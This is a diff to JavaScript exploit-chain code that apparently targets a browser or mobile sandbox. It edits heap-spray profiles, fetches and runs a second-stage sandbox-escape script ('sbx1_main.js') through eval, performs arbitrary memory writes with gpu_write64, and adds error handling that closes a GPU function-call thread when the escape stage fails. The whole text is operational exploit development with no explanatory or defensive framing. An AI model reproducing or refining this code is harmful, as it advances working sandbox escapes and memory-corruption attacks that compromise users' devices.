@@ -7153,9 +7153,7 @@
       spray_profiles.compact
     ],
     "6149d995753968891870832e3fec9195": [
-      spray_profiles.compact,
-      spray_profiles.compact_write_min,
-      spray_profiles.compact_write_soft
+      spray_profiles.compact
     ]
   };
   const chipset_inprocess_attempt_budget = {
@@ -8727,9 +8725,11 @@
         }
         LOG(`[i] sbx1_main.js ready (${sbx1_script.length} bytes)`);
         print("sbx1 fetched, length: " + (sbx1_script ? sbx1_script.length : "null"));
+        let sbx1_eval_ok = false;
         try {
           LOG(`[i] evaluating sbx1_main.js`);
           eval(sbx1_script);
+          sbx1_eval_ok = true;
           LOG(`[i] sbx1_main.js eval returned`);
           print("sbx1 eval completed successfully");
         } catch(sbx1_err) {
@@ -8744,6 +8744,12 @@
         gpu_write64(offsets.emptyString + 0x80n, 0x1200000001n);
         sbx1_end = Date.now();
         log(`[profiler] sbx1 took ${sbx1_end - sbx0_pac_end} ms`);
+        if (!sbx1_eval_ok) {
+          LOG(`[x] SBX1 failed; skipping success-only backend invalidation`);
+          LOG('[i] closing gpu_fcall thread after SBX1 failure');
+          gpu_fcall_close();
+          return;
+        }
         LOG(`[+] SBX1 complete`);
         const preserveBackendConnectionAfterSuccess =
           p.repro_preserve_backend_connection_after_success === true;
